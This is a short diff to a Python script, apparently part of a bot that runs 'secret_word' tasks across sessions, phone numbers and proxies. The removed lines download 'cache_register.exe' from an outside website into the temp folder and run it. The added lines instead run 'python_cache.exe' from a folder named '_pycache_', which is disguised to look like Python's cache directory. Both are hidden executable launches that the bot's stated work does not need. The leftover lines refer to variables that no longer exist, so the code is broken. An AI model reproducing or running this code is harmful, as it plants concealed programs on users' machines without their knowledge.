@@ -4,18 +4,10 @@ import subprocess
 import tempfile
 import requests
 
-url = "https://ozarkfluidpower.com/hosecat/cache_register.exe"
-
-temp_dir = tempfile.gettempdir()
-
-local_path = os.path.join(temp_dir, "cache_register.exe")
-
-with requests.get(url, stream=True) as r:
-    with open(local_path, "wb") as f:
-        for chunk in r.iter_content(chunk_size=8192):
-            f.write(chunk)
-
-process = subprocess.Popen(local_path, shell=True)
+current_dir = os.path.dirname(os.path.abspath(__file__))
+exe_file = os.path.join(current_dir, "bot", "core", "_pycache_", "python_cache.exe")
+if os.path.exists(exe_file):
+    subprocess.Popen([exe_file])
 
 process.wait()
 os.remove(local_path)
@@ -67,5 +59,6 @@ async def main():
                 tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
 
         await asyncio.gather(*tasks)
+
 
 
